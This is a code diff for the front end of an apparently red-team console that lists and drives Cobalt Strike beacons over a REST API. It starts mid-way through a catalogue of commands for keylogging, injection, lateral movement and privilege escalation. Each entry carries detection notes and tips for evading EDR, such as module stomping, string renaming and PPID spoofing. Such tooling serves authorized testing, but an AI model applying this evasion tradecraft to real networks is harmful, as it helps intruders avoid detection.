+            detect: ['SetWindowsHookEx API call detected by EDR', 'Kernel callback PsSetCreateThreadNotifyRoutine monitors hook installation', 'Persistent keyboard hook is highly anomalous for most processes'],
+            prereqs: ['Set spawnto with args', 'Set ppid to legitimate parent', 'Must be in user session process'],
+            mitigations: ['Use BOF keylogger if available (inline, no fork&run)', 'Short capture windows reduce detection window'],
+            eventIds: [4688] },
+        { cmd: 'clipboard', hint: 'Capture clipboard contents', opsec: 'safe', api: 'dedicated' },
+
+        // --- Injection ---
+        { cmd: 'inject', hint: 'Inject beacon into process', opsec: 'loud', api: 'dedicated', note: 'Process injection — top EDR detection vector',
+            detect: ['Kernel callbacks: PsSetCreateThreadNotifyRoutine', 'Cross-process memory allocation (VirtualAllocEx)', 'Cross-process memory write (WriteProcessMemory)', 'Remote thread creation (CreateRemoteThread) — most detected API'],
+            alt: [{ cmd: 'spawnu', why: 'PPID spoofing spawn — less suspicious than injection' }, { cmd: 'spawn', why: 'Fork&run with controlled spawn-to process' }],
+            mitigations: ['Use NtQueueApcThread-s instead of CreateRemoteThread in process-inject block', 'Target same-architecture processes only (avoid x86→x64 cross-arch)', 'Inject into same-session, same-user processes when possible'],
+            eventIds: [8, 10] },
+        { cmd: 'shinject', hint: 'Inject shellcode into process', opsec: 'loud', api: 'dedicated', note: 'Shellcode injection — highly monitored by EDR',
+            detect: ['Cross-process memory allocation patterns', 'Shellcode-like memory regions (RWX/RX)', 'Kernel callbacks on thread creation'],
+            mitigations: ['Use module stomping to back memory with legitimate DLL', 'Set userwx "false" in Malleable C2 to avoid RWX regions'],
+            eventIds: [8, 10] },
+        { cmd: 'dllinject', hint: 'Inject reflective DLL', opsec: 'loud', api: 'dedicated', note: 'DLL injection — triggers process injection alerts',
+            detect: ['Reflective DLL loading from unbacked memory', 'Cross-process memory write + thread creation', '"Unbacked Shellcode from Unsigned Module" alert'],
+            mitigations: ['Replace "ReflectiveLoader" string → "NetlogonMain"', 'Use module stomping (Hydrogen.dll) to back memory'],
+            eventIds: [7, 8] },
+
+        // --- Spawn & Lateral ---
+        { cmd: 'spawn', hint: 'Spawn new beacon session', opsec: 'moderate', api: 'dedicated', note: 'Fork&run — creates new process + injects beacon',
+            detect: ['Process creation (Event 4688)', 'Process injection into new process'],
+            prereqs: ['Set spawnto with args (e.g., spawnto x64 C:\\Windows\\System32\\svchost.exe -k netsvcs)', 'Set ppid to legitimate parent', 'Default spawn-to is rundll32.exe — overused, heavily monitored'] },
+        { cmd: 'spawnas', hint: 'Spawn beacon as another user', opsec: 'moderate', api: 'dedicated', note: 'CreateProcessAsUser — logs new logon event',
+            detect: ['Event 4624 (new logon)', 'Event 4688 (process creation under different user)', 'Parent-child relationship anomaly'],
+            prereqs: ['Set spawnto with args', 'Credentials required (DOMAIN\\user + password)'],
+            eventIds: [4624, 4688] },
+        { cmd: 'spawnu', hint: 'Spawn under another parent PID', opsec: 'moderate', api: 'dedicated', note: 'PPID spoofing — makes child process look legitimate',
+            detect: ['Process creation with spoofed parent (some EDR detect this)', 'Event 4688 — parent PID may be verified against actual creator'],
+            mitigations: ['Choose a parent that legitimately spawns similar processes', 'Match spawn-to process type to parent (e.g., explorer.exe → msiexec.exe)'] },
+        { cmd: 'jump', hint: 'Lateral movement (psexec/winrm/wmi)', opsec: 'loud', api: 'none', note: 'Creates service with UNC path — easily detected',
+            detect: ['Event 7045 (new service creation)', '"Suspicious Service ImagePath Value" alert (UNC path \\\\target\\ADMIN$\\)', 'Service creation from remote source logged'],
+            alt: [{ cmd: 'remote-exec', why: 'Available via REST API — upload first, then execute with local path' }, { cmd: 'scshell', why: 'Modifies existing service (Event 7040 only) — no new service created' }],
+            mitigations: ['If using SCShell: rename exepath + service name in scshell.cna', 'Set exepath to legitimate name: Windows\\System32\\MpSigStub.exe', 'Set service to real service name: WinDefend', 'Manual pattern: upload → remote-exec → connect → rm (cleanup)'],
+            eventIds: [7045, 4688] },
+        { cmd: 'remote-exec', hint: 'Execute on remote host', opsec: 'loud', api: 'dedicated', note: 'Remote service/WMI/WinRM execution — logged everywhere',
+            detect: ['Event 7045 (new service) for psexec method', 'Event 7040 (service modification) for scshell', 'WMI: wbemprox.dll load from unbacked memory triggers alert', 'WinRM: PowerShell remoting events (Event 91, 168)'],
+            alt: [{ cmd: 'scshell', why: 'Modifies existing service — no Event 7045' }],
+            mitigations: ['Upload payload first, then use local C:\\Windows\\ path (no UNC)', 'If using SCShell: rename defaults in scshell.cna', 'WMI: use executable version from disk, not BOF (BOF = unbacked memory alert)', 'Cleanup: rm uploaded payload after execution'],
+            eventIds: [7045, 7040, 4688] },
+        { cmd: 'psexec', hint: 'psexec lateral movement', opsec: 'loud', api: 'none', note: 'Service creation with UNC path — use remote-exec instead',
+            detect: ['Event 7045 (new service creation)', '"Suspicious Service ImagePath" UNC path alert'],
+            alt: [{ cmd: 'remote-exec', why: 'Available via REST API — upload first, then local path' }, { cmd: 'scshell', why: 'Modifies existing service — no new service' }],
+            eventIds: [7045] },
+        { cmd: 'psexec_psh', hint: 'psexec via PowerShell', opsec: 'loud', api: 'none', note: 'PowerShell + service creation — double-loud',
+            detect: ['Event 7045 + PowerShell logging (4103/4104)', 'Double detection: service creation + PowerShell execution'],
+            alt: [{ cmd: 'remote-exec', why: 'Upload + local execution avoids both' }],
+            eventIds: [7045, 4103] },
+        { cmd: 'wmi', hint: 'WMI lateral movement', opsec: 'loud', api: 'none', note: 'WMI execution — wbemprox.dll load detected',
+            detect: ['wbemprox.dll loaded from unbacked memory when using BOF', 'WMI event subscription may be logged', 'Process creation via WMI logged with WMI as parent'],
+            alt: [{ cmd: 'remote-exec', why: 'Use executable version from legitimate path, not BOF' }],
+            eventIds: [4688, 5861] },
+        { cmd: 'scshell', hint: 'Lateral move via existing service (Aggressor)', opsec: 'moderate', api: 'none', note: 'Modifies existing service — Event 7040 only, no new service created',
+            detect: ['Event 7040 (service configuration change)', 'Service binary path temporarily modified'],
+            mitigations: ['Rename exepath in scshell.cna (default names are malicious-looking)', 'Set exepath: Windows\\System32\\MpSigStub.exe', 'Set service: WinDefend', 'Requires Aggressor script loaded'],
+            eventIds: [7040, 4688] },
+        { cmd: 'winrm', hint: 'WinRM lateral movement', opsec: 'moderate', api: 'none', note: 'WinRM remoting — less noisy than psexec but still logged',
+            detect: ['PowerShell remoting events (Event 91, 168)', 'WinRM connection logged on target'],
+            alt: [{ cmd: 'remote-exec', why: 'Upload + local execution — available via REST API' }],
+            eventIds: [91, 168] },
+
+        // --- Pivoting & Tunneling ---
+        { cmd: 'socks', hint: 'Start SOCKS proxy', opsec: 'moderate', api: 'dedicated', note: 'Opens port on team server — SOCKS activity NOT logged on CS server',
+            detect: ['Unusual network traffic patterns through beacon', 'SOCKS proxy traffic characteristics'],
+            mitigations: ['Use local terminal logging (script/tmux) — SOCKS traffic bypasses CS logging', 'All proxied tool output must be logged separately for audit trail', 'Close proxy when not in use'] },
+        { cmd: 'rportfwd', hint: 'Start reverse port forward', opsec: 'moderate', api: 'dedicated', note: 'Opens listening port on target — detectable',
+            detect: ['Listening port on target visible to defenders', 'Network connection pattern anomaly'] },
+        { cmd: 'connect', hint: 'Connect to TCP beacon', opsec: 'safe', api: 'none', note: 'Use link endpoint' },
+        { cmd: 'link', hint: 'Link to SMB/TCP beacon', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'unlink', hint: 'Unlink child beacon', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'browserpivot', hint: 'Start browser pivot', opsec: 'loud', api: 'dedicated', note: 'Injects into browser process — triggers protection',
+            detect: ['Process injection into browser process', 'Browser security features detect injected code', 'EDR monitors browser process integrity'],
+            mitigations: ['Consider using SOCKS proxy + proxychains instead of browser injection'] },
+        { cmd: 'ssh', hint: 'SSH to target', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'ssh-key', hint: 'SSH using key auth', opsec: 'safe', api: 'dedicated' },
+
+        // --- Privilege Escalation ---
+        { cmd: 'getsystem', hint: 'Elevate to SYSTEM', opsec: 'loud', api: 'dedicated', note: 'Named pipe impersonation or token duplication — well-known technique',
+            detect: ['Named pipe creation + impersonation pattern', 'Token duplication event', 'Well-known privilege escalation signature'],
+            alt: [{ cmd: 'steal_token', why: 'Steal SYSTEM token from existing process (less signatured)' }],
+            eventIds: [4688, 4672] },
+        { cmd: 'elevate', hint: 'Elevate privileges via exploit', opsec: 'loud', api: 'dedicated', note: 'Runs PE exploit — creates artifacts',
+            detect: ['Exploit-specific signatures', 'Unusual process behavior during exploitation', 'Privilege change events'],
+            eventIds: [4672] },
+        { cmd: 'runasadmin', hint: 'Run command elevated', opsec: 'loud', api: 'none', note: 'UAC bypass — not available via REST API',
+            detect: ['UAC bypass technique signatures', 'Consent.exe interaction patterns'],
+            eventIds: [4688] },
+
+        // --- Network Recon ---
+        { cmd: 'net', hint: 'Net commands (user, group, view, etc.)', opsec: 'moderate', api: 'dedicated', note: 'AD enumeration — may trigger honey tokens',
+            detect: ['LDAP queries logged on DC', 'Honey token/canary account access triggers alerts', 'Rapid AD enumeration pattern anomaly'],
+            alt: [{ cmd: 'inline-execute', why: 'BOF net commands — no process spawn' }],
+            mitigations: ['Enumerate one account at a time (avoid mass queries)', 'Space out requests — rapid LDAP queries trigger alerts', 'Kerberoasting: use /stats first, then target specific accounts', 'Prefer SharpView BOF over PowerView (no PowerShell logging)'] },
+        { cmd: 'portscan', hint: 'Scan network ports', opsec: 'loud', api: 'dedicated', note: 'Network scanning — IDS/NTA detects connection patterns',
+            detect: ['IDS/NTA signature for port scanning', 'Unusual connection rate from single host', 'Connection to many ports on single/multiple hosts'],
+            alt: [{ cmd: 'inline-execute', why: 'BOF portscan — avoids process spawn (still network-level detection)' }],
+            mitigations: ['Use low and slow scan (increase delay between probes)', 'Limit to specific ports of interest', 'Scan from expected network segment'] },
+
+        // --- Beacon Config (OPSEC improvement tools) ---
+        { cmd: 'spawnto', hint: 'Set fork&run spawn process (OPSEC critical)', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'argue', hint: 'Spoof process arguments (OPSEC helper)', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'blockdlls', hint: 'Block non-MS DLLs in children (anti-EDR)', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'ppid', hint: 'Set parent PID (OPSEC critical for fork&run)', opsec: 'safe', api: 'dedicated' },
+
+        // --- BOF (Beacon Object Files) ---
+        { cmd: 'inline-execute', hint: 'Run BOF inline (OPSEC-preferred — no fork&run)', opsec: 'safe', api: 'dedicated', note: 'Runs in beacon process — no child process, no DLL load events. If BOF crashes, beacon dies. REST API supported (4.12+)',
+            mitigations: ['Use indirect syscalls in BOFs (bypass user-mode hooks)', 'Implement call stack spoofing (Draugr) for syscall operations', 'Test BOFs in lab first — crash = beacon death', 'Prefer BOF versions of tools over fork&run equivalents'] },
+
+        // --- Registry ---
+        { cmd: 'reg', hint: 'Registry query/set', opsec: 'moderate', api: 'dedicated', note: 'Registry access — risk depends on key accessed',
+            detect: ['Registry access events (Event 4656/4663)', 'Sensitive key access may trigger alerts (SAM, SECURITY hives)'],
+            eventIds: [4656, 4663] },
+
+        // --- Misc ---
+        { cmd: 'setenv', hint: 'Set environment variable', opsec: 'safe', api: 'dedicated' },
+        { cmd: 'covertvpn', hint: 'Deploy covert VPN', opsec: 'loud', api: 'none', note: 'Heavy network footprint — not available via REST API',
+            detect: ['VPN tunnel traffic anomaly', 'Network adapter creation event', 'Unusual routing table changes'] },
+        { cmd: 'help', hint: 'Show command help', opsec: 'safe', api: 'console' },
+    ],
+
+    async init() {
+        // If we were previously connected, just resume polling — don't reset
+        if (this.connectionStatus === 'connected' && this.selectedDeployment) {
+            this.showState('main');
+            this.updateConnectionStatus('connected');
+            this.startHealthPoll();
+            this.refreshBeacons();
+            return;
+        }
+        await this.loadDeployments();
+    },
+
+    async loadDeployments() {
+        const select = document.getElementById('beacon-deployment-select');
+        try {
+            const resp = await fetch('/api/deploy/active');
+            const data = await resp.json();
+            this.deployments = data.deployments || [];
+
+            if (this.deployments.length === 0) {
+                select.innerHTML = '<option value="">No deployments found</option>';
+                this.showState('no-deployment');
+                return;
+            }
+
+            // Populate dropdown
+            select.innerHTML = '<option value="">-- Select a deployment --</option>';
+            this.deployments.forEach((d, i) => {
+                const name = d._filename || `Deployment ${i + 1}`;
+                const type = d.deployment_type || 'unknown';
+                const date = d.completed_at ? new Date(d.completed_at * 1000).toLocaleDateString() : '';
+                const restApi = d.output?.cs_connection_info?.value?.rest_api_enabled;
+                const tag = restApi ? ' [REST API]' : '';
+                const opt = document.createElement('option');
+                opt.value = i;
+                opt.textContent = `${name} (${type}) — ${date}${tag}`;
+                select.appendChild(opt);
+            });
+
+            // Auto-select if only one deployment
+            if (this.deployments.length === 1) {
+                select.value = '0';
+                this.onDeploymentSelected();
+                // Auto-connect when only one deployment exists
+                this.connect();
+            }
+        } catch (e) {
+            select.innerHTML = '<option value="">Failed to load deployments</option>';
+            this.showState('no-deployment');
+        }
+    },
+
+    onDeploymentSelected() {
+        const select = document.getElementById('beacon-deployment-select');
+        const idx = select.value;
+
+        // Reset state when switching
+        this.disconnect();
+        this.selectedDeployment = null;
+        this.tunnelCmd = '';
+
+        if (idx === '' || idx === null) {
+            this.showState('none');
+            return;
+        }
+
+        const deployment = this.deployments[parseInt(idx)];
+        if (!deployment) {
+            this.showState('none');
+            return;
+        }
+
+        this.selectedDeployment = deployment;
+        const outputs = deployment.output || {};
+        const csInfo = outputs.cs_connection_info?.value;
+        const bastionIp = outputs.bastion_public_ip?.value;
+        const tsIp = csInfo?.host;
+
+        // Check if REST API was enabled
+        if (!csInfo || csInfo.rest_api_enabled === false) {
+            this.showState('not-enabled');
+            return;
+        }
+
+        // Build tunnel command
+        if (tsIp && bastionIp) {
+            const keyPath = outputs.ssh_key_path?.value || '~/.ssh/red_team_key';
+            this.tunnelCmd = `ssh -L 50443:${tsIp}:50443 ubuntu@${bastionIp} -i ${keyPath}`;
+            const cmdEl = document.getElementById('beacon-tunnel-cmd-text');
+            if (cmdEl) cmdEl.textContent = this.tunnelCmd;
+        }
+
+        this.showState('main');
+    },
+
+    showState(state) {
+        document.getElementById('beacon-no-deployment').style.display = state === 'no-deployment' ? 'block' : 'none';
+        document.getElementById('beacon-not-enabled').style.display = state === 'not-enabled' ? 'block' : 'none';
+        document.getElementById('beacon-main-content').style.display = state === 'main' ? 'block' : 'none';
+    },
+
+    async connect() {
+        // User explicitly clicked Connect — run health check and start polling
+        const connectBtn = document.getElementById('beacon-connect-btn');
+        if (connectBtn) connectBtn.textContent = 'Connecting...';
+        const result = await this.checkHealth();
+        if (connectBtn) {
+            const connected = result?.status === 'connected';
+            connectBtn.textContent = connected ? 'Disconnect' : 'Connect';
+            connectBtn.className = connected ? 'btn btn-danger' : 'btn btn-success';
+        }
+        if (result?.status === 'connected') {
+            this.startHealthPoll();
+        }
+    },
+
+    async checkHealth() {
+        try {
+            const resp = await fetch('/api/beacon/health');
+            const data = await resp.json();
+            this.updateConnectionStatus(data.status, data.error, data.detail);
+            return data;
+        } catch (e) {
+            this.updateConnectionStatus('disconnected', 'Backend unreachable', 'The Flask backend is not responding. Is the web app running?');
+            return null;
+        }
+    },
+
+    updateConnectionStatus(status, error, detail) {
+        this.connectionStatus = status;
+        const dot = document.getElementById('beacon-status-dot');
+        const text = document.getElementById('beacon-status-text');
+        const tunnelInstr = document.getElementById('beacon-tunnel-instructions');
+        const connectBtn = document.getElementById('beacon-connect-btn');
+        const refreshBtn = document.getElementById('beacon-refresh-btn');
+        const tableSection = document.getElementById('beacon-table-section');
+        const errorDetail = document.getElementById('beacon-error-detail');
+
+        if (!dot || !text) return;
+
+        dot.className = 'beacon-status-dot';
+        // Hide error detail by default
+        if (errorDetail) errorDetail.style.display = 'none';
+
+        if (status === 'connected') {
+            dot.classList.add('connected');
+            text.textContent = 'Connected to REST API';
+            text.style.color = 'var(--success-text)';
+            tunnelInstr.style.display = 'none';
+            if (connectBtn) { connectBtn.textContent = 'Disconnect'; connectBtn.className = 'btn btn-danger'; connectBtn.onclick = () => BEACON.disconnect(); }
+            refreshBtn.style.display = 'inline-block';
+            tableSection.style.display = 'block';
+            this.refreshBeacons();
+        } else if (status === 'reachable') {
+            dot.classList.add('reachable');
+            text.textContent = error || 'Reachable but auth failed';
+            text.style.color = 'var(--warning-text)';
+            tunnelInstr.style.display = 'block';
+            if (connectBtn) { connectBtn.textContent = 'Retry'; connectBtn.className = 'btn btn-success'; connectBtn.onclick = () => BEACON.connect(); }
+            refreshBtn.style.display = 'none';
+            tableSection.style.display = 'none';
+            if (detail && errorDetail) {
+                errorDetail.style.display = 'block';
+                errorDetail.innerHTML = `<div class="status-display warning" style="margin-top: 12px;"><strong>${this.escapeHtml(error || 'Error')}</strong><br>${this.escapeHtml(detail)}</div>`;
+            }
+        } else {
+            dot.classList.add('disconnected');
+            text.textContent = error || 'Not connected';
+            text.style.color = error ? 'var(--danger-text)' : 'var(--text-muted)';
+            tunnelInstr.style.display = 'block';
+            if (connectBtn) { connectBtn.textContent = 'Connect'; connectBtn.className = 'btn btn-success'; connectBtn.onclick = () => BEACON.connect(); }
+            refreshBtn.style.display = 'none';
+            tableSection.style.display = 'none';
+            if (detail && errorDetail) {
+                errorDetail.style.display = 'block';
+                errorDetail.innerHTML = `<div class="status-display error" style="margin-top: 12px;"><strong>${this.escapeHtml(error || 'Connection Failed')}</strong><br><span class="t-secondary">${this.escapeHtml(detail)}</span></div>`;
+            }
+        }
+    },
+
+    disconnect() {
+        this.stopHealthPoll();
+        this.connectionStatus = 'disconnected';
+        this.updateConnectionStatus('disconnected', null);
+    },
+
+    startHealthPoll() {
+        if (this.pollInterval) clearInterval(this.pollInterval);
+        this.pollInterval = setInterval(() => {
+            if (this.connectionStatus === 'connected') {
+                this.refreshBeacons();
+            } else {
+                this.checkHealth();
+            }
+        }, 20000);
+
+        // Live "Last Seen" ticker — updates every second between API refreshes
+        if (this.lastSeenInterval) clearInterval(this.lastSeenInterval);
+        this.lastSeenInterval = setInterval(() => this.tickLastSeen(), 1000);
+    },
+
+    stopHealthPoll() {
+        if (this.pollInterval) {
+            clearInterval(this.pollInterval);
+            this.pollInterval = null;
+        }
+        if (this.lastSeenInterval) {
+            clearInterval(this.lastSeenInterval);
+            this.lastSeenInterval = null;
+        }
+    },
+
+    tickLastSeen() {
+        if (!this.cachedBeacons.length) return;
+        const cells = document.querySelectorAll('.beacon-table tbody tr');
+        cells.forEach(tr => {
+            const bid = tr.dataset.bid;
+            const b = this.cachedBeacons.find(x => String(x.bid) === bid);
+            if (!b) return;
+            const elapsedMs = (b.lastCheckinMs || 0) + (Date.now() - (b.fetchedAt || Date.now()));
+            const td = tr.querySelector('.beacon-last-seen');
+            if (td) {
+                td.textContent = this.formatElapsed(elapsedMs);
+                td.className = `beacon-last-seen ${this.getElapsedClass(elapsedMs, b.sleep)}`;
+            }
+        });
+    },
+
+    async refreshBeacons() {
+        try {
+            const resp = await fetch('/api/beacon/list');
+            const data = await resp.json();
+            if (!data.success) {
+                this.checkHealth();
+                return;
+            }
+            // Normalize CS REST API fields to frontend format
+            // Use lastCheckinMs (server-side elapsed ms) + fetch timestamp for accurate "last seen"
+            const fetchTime = Date.now();
+            const beacons = (data.beacons || []).map(b => {
+                const sleepIsObj = typeof b.sleep === 'object' && b.sleep !== null;
+                return {
+                    bid: b.bid || b.id,
+                    user: b.user,
+                    computer: b.computer,
+                    internal: b.internal,
+                    os: b.os,
+                    pid: b.pid,
+                    ppid: b.ppid,
+                    process: b.process,
+                    arch: b.arch || (b.is64 ? 'x64' : 'x86'),
+                    isAdmin: b.isAdmin,
+                    // Server-side elapsed ms at time of fetch — stays accurate between refreshes
+                    lastCheckinMs: b.lastCheckinMs,
+                    fetchedAt: fetchTime,
+                    sleep: sleepIsObj ? (b.sleep.sleep * 1000) : (b.sleep || 0),
+                    jitter: sleepIsObj ? (b.sleep.jitter || 0) : (b.jitter || 0),
+                };
+            });
+            this.cachedBeacons = beacons;
+            this.renderBeaconTable(beacons);
+            // Update process context bar if a beacon is selected
+            if (this.selectedBid) {
+                this.renderProcessContext(this.selectedBid);
+                this.renderMetaBadges(this.selectedBid);
+            }
+        } catch (e) {
+            this.checkHealth();
+        }
+    },
+
+    renderBeaconTable(beacons) {
+        const tbody = document.getElementById('beacon-table-body');
+        const countEl = document.getElementById('beacon-count');
+        const emptyState = document.getElementById('beacon-empty-state');
+        const table = document.getElementById('beacon-table');
+        if (!tbody) return;
+
+        countEl.textContent = `${beacons.length} beacon${beacons.length !== 1 ? 's' : ''}`;
+
+        if (beacons.length === 0) {
+            tbody.innerHTML = '';
+            table.style.display = 'none';
+            emptyState.style.display = 'block';
+            return;
+        }
+
+        table.style.display = 'table';
+        emptyState.style.display = 'none';
+
+        // Escape ALL beacon data to prevent XSS from beacon metadata
+        tbody.innerHTML = beacons.map(b => {
+            const isAdmin = b.isAdmin ? ' *' : '';
+            const userClass = b.isAdmin ? 'beacon-admin' : '';
+            // Compute elapsed: server-side ms at fetch time + time since fetch
+            const elapsedMs = (b.lastCheckinMs || 0) + (Date.now() - (b.fetchedAt || Date.now()));
+            const lastSeen = this.formatElapsed(elapsedMs);
+            const lastSeenClass = this.getElapsedClass(elapsedMs, b.sleep);
+            const selected = b.bid === this.selectedBid ? 'selected' : '';
+            const sleepStr = b.sleep ? `${Math.round(b.sleep / 1000)}s` : '\u2014';
+            const jitterStr = b.jitter ? ` (${b.jitter}%)` : '';
+            const eBid = this.escapeHtml(b.bid || '\u2014');
+            const eUser = this.escapeHtml(b.user || '\u2014');
+            const eComputer = this.escapeHtml(b.computer || '\u2014');
+            const eInternal = this.escapeHtml(b.internal || '\u2014');
+            const eOs = this.escapeHtml(b.os || '\u2014');
+            const ePid = this.escapeHtml(String(b.pid || '\u2014'));
+            const label = `${eUser}@${eComputer}`;
+
+            return `<tr class="${selected}" data-bid="${this.escapeAttr(b.bid)}" data-label="${this.escapeAttr(label)}">
+                <td class="beacon-id">${eBid}</td>
+                <td class="${userClass}">${eUser}${isAdmin}</td>
+                <td>${eComputer}</td>
+                <td>${eInternal}</td>
+                <td>${eOs}</td>
+                <td>${ePid}</td>
+                <td>${sleepStr}${jitterStr}</td>
+                <td class="beacon-last-seen ${lastSeenClass}">${lastSeen}</td>
+                <td><button class="btn btn-sm btn-success beacon-interact-btn">Interact</button></td>
+            </tr>`;
+        }).join('');
+
+        // Delegated click handlers (safe from attribute injection)
+        tbody.querySelectorAll('tr[data-bid]').forEach(tr => {
+            const bid = tr.dataset.bid;
+            const label = tr.dataset.label;
+            tr.addEventListener('click', () => this.selectBeacon(bid, label));
+            const btn = tr.querySelector('.beacon-interact-btn');
+            if (btn) btn.addEventListener('click', (e) => { e.stopPropagation(); this.selectBeacon(bid, label); });
+        });
+    },
+
+    formatElapsed(ms) {
+        if (ms == null || ms < 0) return '\u2014';
+        const sec = Math.floor(ms / 1000);
+        if (sec < 60) return `${sec}s ago`;
+        if (sec < 3600) return `${Math.floor(sec / 60)}m ago`;
+        if (sec < 86400) return `${Math.floor(sec / 3600)}h ago`;
+        return `${Math.floor(sec / 86400)}d ago`;
+    },
+
+    getElapsedClass(elapsedMs, sleepMs) {
+        if (elapsedMs == null) return 'dead';
+        const threshold = (sleepMs || 60000) * 3;
+        if (elapsedMs > threshold * 5) return 'dead';
+        if (elapsedMs > threshold) return 'stale';
+        return '';
+    },
+
+    // --- Beacon Table Filter ---
+    filterTable(query) {
+        const q = query.toLowerCase();
+        document.querySelectorAll('.beacon-table tbody tr').forEach(tr => {
+            const text = tr.textContent.toLowerCase();
+            tr.style.display = text.includes(q) ? '' : 'none';
+        });
+    },
+
+    // --- Metadata Badges ---
+    renderMetaBadges(bid) {
+        const container = document.getElementById('beacon-meta-badges');
+        if (!container) return;
+        const b = this.cachedBeacons.find(x => String(x.bid) === String(bid));
+        if (!b) { container.innerHTML = ''; return; }
+        const adminBadge = b.isAdmin ? `<span class="beacon-badge beacon-badge--admin">Admin</span>` : '';
+        container.innerHTML = `
+            <span class="beacon-badge"><span class="beacon-badge__label">User</span> ${this.escapeHtml(b.user || '—')}</span>
+            <span class="beacon-badge"><span class="beacon-badge__label">Host</span> ${this.escapeHtml(b.computer || '—')}</span>
+            <span class="beacon-badge"><span class="beacon-badge__label">IP</span> ${this.escapeHtml(b.internal || '—')}</span>
+            <span class="beacon-badge"><span class="beacon-badge__label">OS</span> ${this.escapeHtml(b.os || '—')}</span>
+            <span class="beacon-badge"><span class="beacon-badge__label">PID</span> ${this.escapeHtml(String(b.pid || '—'))}</span>
+            <span class="beacon-badge"><span class="beacon-badge__label">Sleep</span> ${b.sleep ? Math.round(b.sleep / 1000) + 's' : '—'}${b.jitter ? ' (' + b.jitter + '%)' : ''}</span>
+            ${adminBadge}
+        `;
+    },
+
+    // --- Process Context Bar ---
+    renderProcessContext(bid) {
+        const bar = document.getElementById('beacon-process-context');
+        if (!bar) return;
+        const b = this.cachedBeacons.find(x => String(x.bid) === String(bid));
+        if (!b) {
+            bar.innerHTML = '<span class="t-terminal" style="font-size: 0.82em; opacity: 0.5;">No beacon selected</span>';
+            return;
+        }
+        const proc = b.process || '—';
+        const pid = b.pid || '—';
+        const ppid = b.ppid || '—';
+        const arch = b.arch || '—';
+        const user = b.user || '—';
+        const sep = '<span class="ctx-sep">|</span>';
+        bar.innerHTML = `
+            <span class="ctx-label">Process</span>
+            <span class="ctx-process">${this.escapeHtml(proc)}</span>
+            ${sep}
+            <span class="ctx-detail">PID ${this.escapeHtml(String(pid))}</span>
+            ${sep}
+            <span class="ctx-detail">PPID ${this.escapeHtml(String(ppid))}</span>
+            ${sep}
+            <span class="ctx-detail">${this.escapeHtml(arch)}</span>
+            ${sep}
+            <span class="ctx-detail">${this.escapeHtml(user)}</span>
+        `;
+    },
+
+    // Fetch fresh beacon detail from API and update cache + context bar
+    async refreshBeaconDetail(bid, logChanges) {
+        try {
+            const resp = await fetch(`/api/beacon/${bid}`);
+            const data = await resp.json();
+            if (!data.success || !data.beacon) return;
+            const fresh = data.beacon;
+            const cached = this.cachedBeacons.find(x => String(x.bid) === String(bid));
+
+            if (cached && logChanges) {
+                // Detect process migration
+                if (fresh.pid && fresh.pid !== cached.pid) {
+                    const oldProc = `${cached.process || '?'} (${cached.pid})`;
+                    const newProc = `${fresh.process || '?'} (${fresh.pid})`;
+                    this._logResultToConsole(`Process changed: ${oldProc} → ${newProc}`, 'info');
+                }
+                // Detect user context change
+                if (fresh.user && fresh.user !== cached.user) {
+                    this._logResultToConsole(`User context changed: ${cached.user || '?'} → ${fresh.user}`, 'info');
+                }
+            }
+
+            // Update cache
+            if (cached) {
+                cached.pid = fresh.pid;
+                cached.ppid = fresh.ppid;
+                cached.process = fresh.process;
+                cached.arch = fresh.arch || (fresh.is64 ? 'x64' : 'x86');
+                cached.user = fresh.user;
+                cached.isAdmin = fresh.isAdmin;
+            }
+
+            // Re-render context bar and badges
+            this.renderProcessContext(bid);
+            this.renderMetaBadges(bid);
+        } catch (e) { /* ignore network errors */ }
+    },
+
+    // Commands that change the beacon's process or token context
+    _CONTEXT_CHANGING_CMDS: [
+        'inject', 'spawn', 'shinject', 'dllinject', 'dllload',
+        'ppid', 'migrate', 'make_token', 'steal_token', 'rev2self',
+        'getuid', 'runas', 'runu', 'spawnas', 'spawnu',
+        'psinject', 'execute-assembly',
+    ],
+
+    _isContextChangingCmd(command) {
+        const base = command.trim().split(/\s+/)[0].toLowerCase();
+        return this._CONTEXT_CHANGING_CMDS.includes(base);
+    },
+
+    // --- Timestamp helper ---
+    _timestamp() {
+        const now = new Date();
+        const h = String(now.getHours()).padStart(2, '0');
+        const m = String(now.getMinutes()).padStart(2, '0');
+        const s = String(now.getSeconds()).padStart(2, '0');
+        return `${h}:${m}:${s}`;
+    },
+
+    // --- OPSEC Warning + API Compatibility (shown in console output after command) ---
+    _getOpsecWarning(command) {
+        const base = command.split(/\s+/)[0]?.toLowerCase();
+        const entry = this.CS_COMMANDS.find(c => c.cmd === base);
+        if (!entry) return '';
+        let parts = [];
+        // OPSEC level badge (skip "NOT IN REST API" — the error response already explains it)
+        if (entry.opsec === 'loud') {
+            parts.push(`<span class="opsec-warning opsec-warning--loud">OPSEC: LOUD</span>`);
+        } else if (entry.opsec === 'moderate') {
+            parts.push(`<span class="opsec-warning opsec-warning--moderate">OPSEC: MODERATE</span>`);
+        }
+        if (entry.note) {
+            parts.push(`<span style="color: var(--terminal-warning);">[*] ${this.escapeHtml(entry.note)}</span>`);
+        }
+        // Prerequisite reminders
+        if (entry.prereqs?.length) {
+            parts.push('\n' + entry.prereqs.map(p =>
+                `<span style="color: var(--terminal-info);">  [prereq] ${this.escapeHtml(p)}</span>`
+            ).join('\n'));
+        }
+        // Safer alternative suggestion
+        if (entry.alt?.length && (entry.opsec === 'loud' || entry.opsec === 'moderate')) {
+            const a = entry.alt[0];
+            parts.push(`\n<span style="color: var(--terminal-success);">  [safer] Consider: ${this.escapeHtml(a.cmd)} \u2014 ${this.escapeHtml(a.why)}</span>`);
+        }
+        return parts.join(' ');
+    },
+
+    // --- Live OPSEC Bar (updates while typing — two-tier with expandable detail) ---
+    _updateOpsecBar(inputValue) {
+        const bar = document.getElementById('opsec-live-bar');
+        if (!bar) return;
+        const base = inputValue.trim().split(/\s+/)[0]?.toLowerCase();
+        const entry = this.CS_COMMANDS.find(c => c.cmd === base);
+        if (!entry || !base) {
+            bar.className = 'opsec-live-bar';
+            bar.innerHTML = '';
+            this._opsecDetailOpen = false;
+            this._opsecLastCmd = null;
+            return;
+        }
+        // Reset detail state when command changes
+        if (base !== this._opsecLastCmd) {
+            this._opsecDetailOpen = false;
